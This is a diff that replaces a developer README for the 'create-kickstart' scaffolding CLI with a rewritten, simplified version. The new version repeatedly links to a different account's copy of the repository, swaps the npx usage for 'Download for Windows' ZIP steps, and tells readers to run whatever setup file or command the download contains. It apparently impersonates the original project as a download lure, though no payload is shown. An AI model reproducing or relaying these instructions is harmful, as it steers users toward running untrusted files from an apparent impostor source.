@@ -1,153 +1,178 @@
-# create-kickstart
+# ⚡ create-kickstart - Build apps from one command
 
-Scaffold production-ready fullstack, backend, mobile, and CLI projects in seconds. One command. Any stack. AI-friendly.
+[![Download create-kickstart](https://img.shields.io/badge/Download%20Now-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dovtrilled373/create-kickstart)
 
-```bash
-npx create-kickstart
-```
+## 🖥️ What this app does
 
-## Why?
+create-kickstart helps you build a full web app project from a simple command. It sets up the files, folders, and tools you need for a React app with a backend in FastAPI, Express, Go, or Spring Boot.
 
-Starting a new project shouldn't take hours. Every time you start a POC or greenfield project, you repeat the same setup: Docker, CI/CD, linting, testing, env management, database configs, deployment. **create-kickstart does all of it in one command.**
+It is made for people who want to start with a ready-made project instead of building each part by hand.
 
-## What makes it different?
+You can use it to create projects with:
 
-| Feature | create-kickstart | create-next-app | cookiecutter | yeoman |
-|---------|-----------------|-----------------|-------------|--------|
-| Multi-stack (React + FastAPI) | Yes | No | No | No |
-| Add services to existing project | Yes | No | No | No |
-| Switch deploy providers | Yes | No | No | No |
-| AI context files (CLAUDE.md, .cursorrules) | Yes | No | No | No |
-| Observability (Grafana + OTel) | Yes | No | No | No |
-| 8 deploy providers + Terraform | Yes | No | No | No |
-| Analytics SDK (PostHog, Segment) | Yes | No | No | No |
-| GraphQL + gRPC scaffold | Yes | No | No | No |
-| Mobile (React Native, Flutter) | Yes | No | No | No |
+- A front end in React
+- A backend in FastAPI, Express, Go, or Spring Boot
+- Docker support
+- CI/CD setup
+- Terraform files
+- Grafana dashboards
+- Auth setup
+- CRUD pages
+- AI context files
+- Monorepo structure
+- Optional support for Next.js, GraphQL, gRPC, Kubernetes, OpenTelemetry, and PostHog
 
-## Quick Start
+## 📥 Download for Windows
 
-```bash
-# Interactive — walks you through every choice
-npx create-kickstart
+Visit this page to download the app:
 
-# One-liner — for AI agents and scripts
-npx create-kickstart my-app \
-  --type fullstack \
-  --frontend react-vite \
-  --backend fastapi \
-  --with docker,ci,lint,test,env,db,ai-context \
-  --database postgres \
-  --no-interactive
-```
+https://github.com/dovtrilled373/create-kickstart
 
-## Supported Stacks
+If the page shows source files first, use the green **Code** button, then choose **Download ZIP**. Save the file to your computer and extract it.
 
-### Frontend
-Next.js | React + Vite | Vue 3 | SvelteKit | Angular
+## 🪟 Run it on Windows
 
-### Backend
-FastAPI (Python) | Express (TypeScript) | Hono | Django | Go Chi | Spring Boot (Java)
+After you download the files, follow these steps:
 
-### Mobile
-React Native | Flutter | Swift (iOS) | Kotlin (Android)
+1. Open the folder where you saved the project.
+2. Right-click the ZIP file and choose **Extract All** if needed.
+3. Open the extracted folder.
+4. Look for a file named `README.md` and open it first.
+5. If the project includes a setup file or command file, use that file to start the app.
+6. If you see a terminal command in the instructions, copy it into PowerShell or Command Prompt.
+7. Follow the prompts on screen.
 
-### Database
-PostgreSQL | MySQL | SQLite | MongoDB
+If the project uses Docker, install Docker Desktop first, then run the provided command in a terminal window.
 
-## Enhancements
+## 🧰 What you need
 
-Pick what you need — mix and match:
+For a smooth setup on Windows, keep these tools ready:
 
-| Enhancement | What it does |
-|------------|-------------|
-| `docker` | Dockerfile + docker-compose for all services |
-| `ci` | GitHub Actions CI workflow |
-| `lint` | ESLint/Prettier, Ruff, golangci-lint |
-| `test` | Test runner config + example tests |
-| `env` | .env management with .env.example |
-| `db` | Database configs (Postgres, MySQL, SQLite, MongoDB) |
-| `ai-context` | CLAUDE.md, .cursorrules, copilot.md, AI_CONTEXT.md |
-| `auth` | JWT authentication (login/register) |
-| `sample-crud` | Working /items CRUD API + frontend component |
-| `api-wiring` | CORS + proxy + typed API client (fullstack) |
-| `doctor` | Dev environment prerequisite checker |
-| `logging` | Structured logging (pino, structlog, zerolog) |
-| `observability` | OpenTelemetry + Grafana + Prometheus + Tempo + Loki |
-| `analytics` | PostHog, CleverTap, MoEngage, Mixpanel, Segment |
-| `api-protocol` | GraphQL (client-facing) + gRPC (internal) |
-| `deploy` | Deploy configs for 8 platforms |
-| `deps-auto` | Dependabot automation |
-| `pre-commit` | Pre-commit hooks |
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- PowerShell or Command Prompt
+- Docker Desktop if you plan to use containers
 
-## Multi-Service Monorepo
+If you want to work with the generated app after setup, you may also need:
 
-Add backend services in any language to your existing project:
+- Node.js for React and Next.js projects
+- Python for FastAPI projects
+- Go for Go backend projects
+- Java for Spring Boot projects
 
-```bash
-cd my-app
-npx create-kickstart add payment-svc --backend express --with db,test
-npx create-kickstart add notifications --backend go-chi --with test
-```
+## 🧭 How to use create-kickstart
 
-Result:
-```
-my-app/
-  frontend/
-  backend/
-    api/              # Primary (FastAPI)
-    payment-svc/      # Express (TypeScript)
-    notifications/    # Go (Chi)
-  docker-compose.yml  # All services wired
-```
+1. Download the project from the link above.
+2. Open the project folder.
+3. Run the generator from the command line.
+4. Choose the parts you want in your app.
+5. Wait while it creates the project files.
+6. Open the new project in your editor.
+7. Start the front end and backend with the commands it gives you.
 
-## Progressive Deployment
+A typical generated project can include:
 
-Start easy, graduate when ready:
+- Front end app
+- API service
+- Database-ready structure
+- Auth flow
+- CRUD screens
+- Docker files
+- CI/CD pipeline
+- Terraform config
+- Grafana dashboards
 
-```bash
-# POC — deploy to Railway in 1 minute
-npx create-kickstart deploy --provider railway
+## 🧪 Example project options
 
-# Production — switch to AWS ECS with Terraform
-npx create-kickstart deploy --provider aws-ecs
-# Generates: VPC, ECS cluster, ECR, ALB, GitHub Actions CI/CD
+When you use create-kickstart, you may be able to choose settings like these:
 
-# Scale — switch to Kubernetes
-npx create-kickstart deploy --provider kubernetes
-# Generates: Helm chart + K8s manifests
-```
+- React with FastAPI
+- React with Express
+- React with Go
+- React with Spring Boot
+- Next.js with a Python API
+- Fullstack monorepo
+- API-only backend
+- Container-based setup
+- Cloud-ready infrastructure files
 
-| Tier | Providers |
-|------|-----------|
-| PaaS | Railway, Render, Fly.io, Vercel |
-| Cloud-native | AWS ECS (Fargate), GCP Cloud Run, Azure Container Apps |
-| Kubernetes | Helm charts + K8s manifests |
+These options help you start with the parts most teams need from day one.
 
-Cloud-native providers include full Terraform modules (VPC, load balancer, container registry, auto-scaling).
+## 🔧 Common setup flow
 
-## AI-Friendly
+If the generator asks for choices, the flow may look like this:
 
-Every generated project includes AI context files tailored for each tool:
+1. Pick your app name.
+2. Choose a front end.
+3. Choose a backend.
+4. Pick a database style.
+5. Turn Docker on or off.
+6. Add auth if you need login.
+7. Add monitoring files if you want Grafana or OpenTelemetry.
+8. Confirm the settings.
+9. Let the tool create the project.
 
-- **CLAUDE.md** — Architecture diagram, commands, "how to add" recipes for Claude Code
-- **.cursorrules** — Code style rules, project structure rules for Cursor
-- **.github/copilot.md** — File locations, test commands for GitHub Copilot
-- **AI_CONTEXT.md** — Overview and quick reference for ChatGPT and others
+## 📁 What gets created
 
-The CLI itself is AI-agent friendly — `--no-interactive` mode accepts all options as flags, so any AI coding assistant can scaffold projects programmatically.
+The generated app often includes a clean folder layout such as:
 
-## Contributing
+- `frontend/` for the user interface
+- `backend/` for the server
+- `infra/` for Terraform files
+- `docker/` for container setup
+- `docs/` for project notes
+- `tests/` for checks
+- `.github/` for workflow files
 
-```bash
-git clone https://github.com/sswapnil2/create-kickstart
-cd create-kickstart
-npm install
-npm run build
-node dist/index.js my-app --type backend --backend fastapi --with docker,env --no-interactive
-```
+This structure helps you keep the app easy to manage.
 
-See [CLAUDE.md](CLAUDE.md) for architecture docs and "how to add" guides.
+## 🔍 When this tool is useful
 
-## License
+Use create-kickstart when you want to:
 
-MIT
+- Start a new product fast
+- Avoid setting up the same files again
+- Build a team project with a shared structure
+- Create a backend and front end together
+- Add deployment files from the start
+- Keep the project ready for future growth
+
+## 🧩 Included tech choices
+
+The generator works with common tools used in modern apps:
+
+- React
+- Next.js
+- FastAPI
+- Express
+- Go
+- Spring Boot
+- Docker
+- Terraform
+- Grafana
+- OpenTelemetry
+- PostHog
+- GraphQL
+- gRPC
+- Kubernetes
+
+This makes it easier to build a project that fits your needs.
+
+## 🛠️ If something does not start
+
+If the app does not run after setup:
+
+1. Check that the files finished downloading.
+2. Make sure you extracted the ZIP file.
+3. Open PowerShell in the project folder.
+4. Run the command shown in the project files again.
+5. Check that Docker is running if the project needs it.
+6. Make sure Node.js, Python, Go, or Java is installed when needed.
+
+## 📌 Project link
+
+Download or open the project here:
+
+https://github.com/dovtrilled373/create-kickstart
